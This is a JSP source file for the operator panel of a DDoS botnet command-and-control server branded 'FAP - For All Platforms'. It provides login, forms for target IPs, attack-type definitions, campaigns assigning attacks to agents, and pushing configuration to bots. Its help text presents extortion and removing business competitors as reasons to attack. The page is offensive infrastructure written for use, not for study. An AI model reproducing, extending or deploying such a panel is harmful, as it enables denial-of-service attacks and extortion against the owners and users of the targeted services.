<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%><%@ page import="java.util.*"%><%@ page
	import="com.fapddos.utils.*"%>
<%
	//Get Session
	HttpSession asession = request.getSession(true);
	Boolean isAuthed = false;
	//Are we authenticated?
	try {
		if (session != null) {
			Enumeration<String> sessionProps = session
					.getAttributeNames();
			if (sessionProps != null) {
				while (sessionProps.hasMoreElements()) {
					String prop = sessionProps.nextElement();
					if (prop.equals("auth")) {
						try {
							Boolean si = (Boolean) session
									.getAttribute("auth");
							if (si) {
								isAuthed = true;
							}
						} catch (Exception e) {
							isAuthed = false;
						}
					}
				}
			}
		}
	} catch (Exception e) {
		isAuthed = false;
	}
%><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>C2 - FAP - For All Platforms</title>
<link rel="stylesheet" type="text/css" href="css/fap.css">
<script src="js/jquery.js"></script>
<script type="text/javascript" src="js/_lib/jquery.cookie.js"></script>
<script type="text/javascript" src="js/_lib/jquery.hotkeys.js"></script>
<script type="text/javascript" src="js/jquery.jstree.js"></script>
<script src="js/jquery.alerts.js" type="text/javascript"></script>
<script src="js/fap.js"></script>
</head>
<body bgcolor="#007A00">
	<table width="100%">
		<tr>
			<td width="90%"><img src="img/fap.png"
				alt="FAP - For All Platforms" /></td>
			<td width="*" align="right" valign="top">
				<div id="topRight" style="visability: hidden; display: none;">
					<input type="button" value="logout" onclick="javascript:logout();" />
				</div>
			</td>
		</tr>
	</table>
	<div id="login">
		<table>
			<tr>
				<td>Password:</td>
				<td><form onsubmit="javascipt: login();" action="#">
						<input type="password" id="authpass" />
					</form></td>
			</tr>
			<tr>
				<td><input type="button" id="authbtn" value="Login"
					onclick="javascipt: login(); " /></td>
			</tr>
		</table>
		<div id="loginmsg"></div>
	</div>
	<div id="main"
		style="visability: hidden; display: none; height: 1000px; box-shadow: 10px 10px 5px #000000;">

		<table bgcolor="#003300" height="80%" width="100%" bordercolor="black"
			border="0" cellspacing="1" cellpadding="1">
			<tr height="100%">
				<td width="20%" height="100%" valign="top">
					<div id="menu" style="height: 1200px;"></div>
				</td>
				<td width="80%" height="100%" bgcolor="black" valign="top"
					style="background-image: url('img/tri2.png'); background-position: bottom right; background-repeat: no-repeat">
					<div id="contention"
						style="visability: hidden; display: none; height: 1000px; color: white; box-shadow: 10px 10px 5px #000000;">
						What is a Contention:<br /> A contention is your reason for
						attacking.<br /> Somehow your target is the reason for strife in
						your world.<br /> Let us re-visit the main reasons:
						<ul>
							<li>Extortion
								<ul>
									<li>They haz money you want!</li>
								</ul>
							</li>
							<li>Removing Competition
								<ul>
									<li>They haz money you should have!</li>
								</ul>
							</li>
							<li>Political / Activism
								<ul>
									<li>They haz your Playstation!</li>
								</ul>
							</li>
						</ul>
					</div>
					<div id="editcontention"
						style="visability: hidden; display: none; height: 1000px; color: white; box-shadow: 10px 10px 5px #000000;">
						<input type="hidden" id="contention_id" value="" /> Reason for
						b33f?<br /> <input type="text" id="contention_title" /><br /> <br />
						Why so mad bro?<br /> <br />
						<textarea rows="10" cols="200" id="contention_reason"></textarea>
						<br /> <input type="button" id="con_btn" value="Add Contention"
							onclick="javascript: submitContention();" />
					</div>
					<div id="Campaign"
						style="visability: hidden; display: none; height: 1000px; color: white; box-shadow: 10px 10px 5px #000000;">Campaign</div>
					<div id="editCampaign"
						style="visability: hidden; display: none; height: 1000px; color: white; box-shadow: 10px 10px 5px #000000;">
						<input type="hidden" id="campaignId" />
						<input type="hidden" id="campaignParent" />
						Campaign Name:<input type="text" id="campaignName" /><br /> 
						Target: <select id="campaignTarget" style="width: 300px"></select><br /> 
						Attack Type: <select id="campaignAttackType" style="width: 300px"></select><br />
						Agent: <select id="campaignAgent" style="width: 300px"></select><br />
						<input type="button" id="camp_btn" value="Add Campaign"
							onclick="javascript: submitCampaign();" />
							<br />
							<br />
							<div id="campaignUrl"></div>
					</div>

					<div id="attacktype"
						style="visability: hidden; display: none; height: 1000px; color: white; box-shadow: 10px 10px 5px #000000;">
						What is an Attack Type:<br /> At this layer the C2 will tell the
						troops how to attack the target(s). <br /> <br /> In the DDoS
						world, you will define the types of attacks, and depending on the
						properties of a participating bot's environment could determine
						the attack vector.<br /> <br /> You can't tell a ground tank to
						fly to a location on its own.<br />
					</div>
					<div id="editattacktype"
						style="visability: hidden; display: none; height: 1000px; color: white; box-shadow: 10px 10px 5px #000000;">
						<input id="attackId" type="hidden" /> Attack Type Name:<br /> <input
							type="text" id="attackName" /><br /> <br /> Attack Definition:
						<br />
						<textarea rows="30" cols="200" id="attackDefinition"></textarea>
						<br /> <input type="button" id="atty_btn" value="Add Attack Type"
							onclick="javascript: submitAttackType();" />
					</div>
					<div id="target"
						style="visability: hidden; display: none; height: 1000px; color: white; box-shadow: 10px 10px 5px #000000;">
						What is a Target br0?:<br /> <br /> A target is a IP address a host name.
					</div>
					<div id="edittarget"
						style="visability: hidden; display: none; height: 1000px; color: white; box-shadow: 10px 10px 5px #000000;">
						<input type="hidden" id="targetId" /> 
						Target Name: <input type="text" id="targetName" /><br /> 
						Target IP:<input type="text" id="targetIp" /><br />  
						<input type="button" id="targets_btn" value="Add Target"
							onclick="javascript: submitTarget();" />
					</div>
					<div id="config"
						style="visability: hidden; display: none; height: 1000px; color: white; box-shadow: 10px 10px 5px #000000;">

						Change Password: <input type="password" id="confpass1"
							name="confpass1" /><br /> Make sure br0: <input type="password"
							id="confpass2" name="confpass2" /><br /> <input type="button"
							onclick="javascript: chpass();" value="change password" /> <br />
						Configuration Data:<br />
						<textarea rows="50" cols="200" id="confconfigjson"
							name="confconfigjson"></textarea>
						<br /> <input type="button" onclick="javascript: pushconfig();"
							value="Push Configuration" /> <input type="button"
							onclick="javascript: savetodisk();"
							value="Save Configuration to Disk" />
					</div>
					<div id="agents"
						style="visability: hidden; display: none; height: 1000px; color: white; box-shadow: 10px 10px 5px #000000;">
						Agents Act like mini command and control.<br /> <br /> Instead
						of everyone coming back to just one central source for
						information, one can setup an agent to recieve a configuration and
						manage the attack more effectivly.
					</div>
					<div id="editagents"
						style="visability: hidden; display: none; height: 1000px; color: white; box-shadow: 10px 10px 5px #000000;">
						<input type="hidden" id="agentId" /> Agent Name: <input
							type="text" id="agentName" /><br /> Agent URL: <input
							type="text" id="agentURL" /><br /> <input type="button"
							id="agent_btn" value="Add Agent"
							onclick="javascript: submitAgent();" />
					</div>
					<div id="bear">
						<pre>                                                                             
                                 .,LDj,.                                                            
                              ;W#KEGGGDW#;                                                          
                             KKLLGDDGGLLL#K                                                         
                           ;#LEDDDDDDDEDGLD#                                                        
                           #DDDDDDEKKEDDDDLWD                                                       
                          EDDDEE##WEKW##KDELK:                          ;W#####Wi                   
                         :#DDDD#Giiiiit##EDGG#                        .###KDGGGDKD                  
                         fEDDDWGiititiiiG#DDLWDE######WW#####f,      WWDDEDDDDDDGL#                 
                         WDDDD#tiiitiiti;#KDDEKEEEDDEDDDDDDEKW##W;  WEDDDDDDDKKKELGL                
                         #DDEK#;itiiiitE##EDDDDDDDDEDDDDDDDDDDDDEW###DDDDDK##KEK##GKj               
                         #DDDWWiiitiiE##KDDDDDDDDDDDDDDEDDGGGGLGGGGK##KDG##Lti;,,#EG#               
                         #DDDKWitiiK#WEDDDDDDDDDDDDDDDDGLLLLGLGLLLLLLD###G;ii,,,,iEL#               
                         #DDDKWiifW#KDDDDDDDDDDDDDDDDGLGLLLLLLLLLLLLLLLK#tit;,,,,;EL#               
                         #DDDD#;G#KDDDDDDDDDDDDDDDEDLLLLLLLLLLLLLLLLLLGLL#K;,,,,,iDG#               
                         GEDDDKW#EDDDDDDDDDDDDDDDEDLLLLGLLLLLLLLLLLLLGLGLLWD.,,,,fDG#               
                         :#DEDDWEDDDDDDDDDDDDDDDEGLGLGLLLLLLLLLLLLLLGLLGLLLWW:,,,EDD#               
                          EDDDDDDDDDDDDDDDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLLWL::LDD#G               
                           #EW#DDDDDDDDDDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLGLG#LDDDGK                
                           t##DDDDDDDDDDDDDDDDDLLLLGLLLLLLLLLLLLLLLLLLLLGLLLLE#DDG#:                
                           ;#DDDDDDDDDDDDDDDDDGLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLWEDWK                 
                          .#DDDDDDDDDDDDDDDKWWKEGLLLLLLLLLLLLLLLLLLLLLLLLLLLGLL##G                  
                          DEDDDDDDDDDDDDDEW#DffGKELLLLLLLLLLLLLLLLLLLLLLLLLLLGLWW                   
                         ,#DDDDDDDDDDDDDK#G      tKGLLLLLLLLLLLLLLLLLLLGGGGGLGLG#                   
                         GEDDDDDDDDDDDDE#L        ;ELLLLLLLLLLLLLLLLLGEWWEKKDLLL#                   
                         #DDDDDDDDDDDDD##          LGLLLLLLLLLLLLLLGDWj     tKGLD;                  
                        :KDDDDDDDDDDDDD#f          ,KLLLLLLLLLLLLLLD#,       tKLGG                  
                        EDDDDDEDDDDDDDE#:    DW:    ELLLLLLLLLLLLLL#t         iEL#                  
                        #DDDDDDDDDDDDDE#:    ##t    DLLLLLLLLLLLLLDE.          KL#.                 
                       i#DDDDDDDDDDDDDE#,    LD.    KLLLLLLLLLLLGGWj     t,    GGWf                 
                       LWDDDDDDDDDDDDDD#f          :KLLLLLLLLLLLLG#i    i#W    LDEE                 
                       WEDDDDDDDDDDDDDD##          GGLLLLLLLLLLLLG#t    t#W    LDD#                 
                       #DDDDDDDDDDDDDDDE#f        ,ELLLLLLLLLLLLLLWL     t,    EGG#                 
                      .WDDDEDDDDDDDDDDDDE#E:    .LKGLLLLGLGLLLLGLGDW,         :WLG#                 
                      ,KDDDDDDDDDDDDDDDDDK#WGjtfEELLGLLLLLGLLGLLGLG#D         GDLG#                 
                      GEDDDDDDDDDDDDDDDDDDDEKKEDDLLfffffffLLGGGGLLLD#G.     .KWLLL#                 
                      #DDDDDDDDDDDDDDDDDDDDDDEW#W;;;;;;;i;;;itfLLGLLD#Wt. .fWKGLLL#                 
                     i#DDDDEDDDDDDDDDDDDDDDDD#D,;;;;ii;;f####j;;;ijEDGEW###KDLLLLL#.                
                     EEDDDDDDDDDDDDDDDDDDDDD#G;;;;;i;;;K######j;;;;##ELGGGGGLLLLLLK:                
                     #DDDDDDDDDDDDDDDDDDDDDW#t;;i;;;;;t########;;;i;;WWLGLLLLLLLLLE;                
                    GDDDDDDDDDDDDDDDDDDDDDD#Gi;;;;;;;;t########;;i;;i;#GLLLLLLLLLLDf                
                   ,#DDDDDDDDDDDDDDDDDDDDDD#fi;i;ii;i;;#######D;i;;;;;EDLLLLLLLLLLGf                
                   #DDDDDDDDDDDDDDDDDDDDDDD#Lt;;ii;;;;itW####G;;;;;;;iDDLLLLLLLLLGLD                
                  LEDDDDDDDDDDDDDDDDDDDDDDD#Etti;;;iitttiE#Ef;;;;;;ii,KGLLLLLLLLLLL#                
                 LWDDDDDDDDDDDDDDDDDDDDDEEDD#GttttttttfDKKDGjtti;;;;;j#GGLLLLLLLLLL#;               
                 #DDDDDDDDDDDDDDDDDDDDDDDDDDD##DGLGEW####W###GtttitiiWWLGLLLLLLLGLLKK               
                EEDDE#KDDDDDDDDDDDDDDDDDDDDDDDEW#KKKEi,,,,,iL##WGjtLWKLLLLLLLLLLLLGG#               
               EWDE##WDDDDDDDDDDDDDDDDDDDDDDDDDKKLLKG;,,;,,,;iD#####DLGGGLLLLLLLLLGLWi              
              E#WG,G#DDDDDDDDDDDDDDDDDDDDDDDDDDKKGLWL;,,,,,,;;GLWDfGLLLLLLLLLLLLLLLLG#.             
               .   WEDDDDDDDDDDDDDDDDDDDDDDDDDDKWLLWD;,,,,,,,iGL#GGGGLLGLLGGLGLGLWEGGWK             
                  .WGEDEDDDEDDDDDDDDDDDDDDDDDDDE#LGKW,,,,,,,,ELG#LLLGLLLGLLWWLLGL#W#WW##.           
                  iEEDE#EDDDDDDDDDDDDDDDDDDDDDDE#LLE#,;,,,,,:WLE#LLLLLGLLGGE#GLLG# .,ff:            
                  LDDW##DDD#KDDEWEDDDDDDDDDDDDDD#GLL#j,,,,,,LLL#DGLGLLKDGLG##KLGED                  
                  DE###EDE##KDD#WKDDWDDDDDDDDDDDWELLDE;,,,,;jLf#GGLGLLKKGGK#DWGDWt                  
                  #DL##EW#EW#DWKD#D#WDDEDDDDDDDDD#GGLDEft;,ijLKELLLLLLEWDE#DD#DK#j                  
                  , #####DDK#K#DD#W#EDDDDDDDDDDDD#KLGLLK#L,;fG#LLLLLLLD#D#WDD#W#W#L                 
                   WDEEDDDDD##DDDEWDEDDDDDDDDDDDDD#ELLLLGj;;f#WLLLLLLLG##KDDDK#KLLEK                
                  iEDDDDDDDDEEDDDDDDDDDDDDDEDGGLGED#WGLLGf;;DWLGLLLLLGLWWDDDDGLLLLLW#               
                 ;#DDDDDDDDDDDDDDDDDDDDDDDEGLLLLGGDDW##WWEfLKLGLLLLLLGLDDDDDDGLGLGGLEW              
                 WEDDDDDDDDDDDDDDDDDDDDDDDGLLGLLGLGDDKKW##KGLGLLLLLLLGLDDDDDDDLLGGLLLW#             
                jKDDDDDDDDDDDDDDDDDDDDDDDLLGLLLLLGGLGDDDDGLGGGLGLLLLLLLKWDDDDDGLGLLGLLKL            
               .#DDDDDDDDDDDDDDDDDDDDDDGLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLWWDDDDDDLGGLLLLL#D           
               EKDDDDDDDDDDEDDDDDDDDDDDGLLLLLLLLLLLLLLLLLLLLGLLLLLLLLGLKWDDDDDDGLLLLGGLG#           
               #DDDDDDDDDDDDKDEDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLLLLGGLW#DDDDDDDDLLLGLLLGE          
              ;KDEDDDDDDDDDK#DDDDDDDDDGGLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLW#KDDDDDDDDDGLGLGL#          
              EDDDDDDDDDDDD#EDDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLGLL#,;#EDDEDDDEEGLLLLGW         
              #DDDDDDDDDDDD#DDEDDDDDDGLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLGLL#i :##EEDDW#GLLLLLL#         
             fWDDDDDDDDDDDDWDDDDDDDDDGLGLLLLLLLLLLLLLLLLLLLLLLLLLLLLLGL#,   ,W###ELLLLLLLL#         
             #EDDDDDDDDDDDEKDDDDDDDDDGLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLGL#.      #ELGLGLLLLL#         
             #DDDDDDDDDDDDEKDDDDDDDDDGLLLGLLLLLGLLLLLLLLLLLLLLLLLLLLLGG#     .WLLLGLLLLLLG#         
 </pre>


					</div>

				</td>
			</tr>
		</table>

		<br />
		<div id="consolelog"
			style="background-color: white; height: 100px; width: 100%; box-shadow: 10px 10px 5px #000000;visability: hidden; display: none;">
			CONSOLE</div>
		<br /> <br />
	</div>
	<%
			if (isAuthed) {
		%>
	<script>
			authstate();
		</script>
	<%
			}
		%>
	<input type="hidden" id="selected_parent" value="" />
</body>
</html>
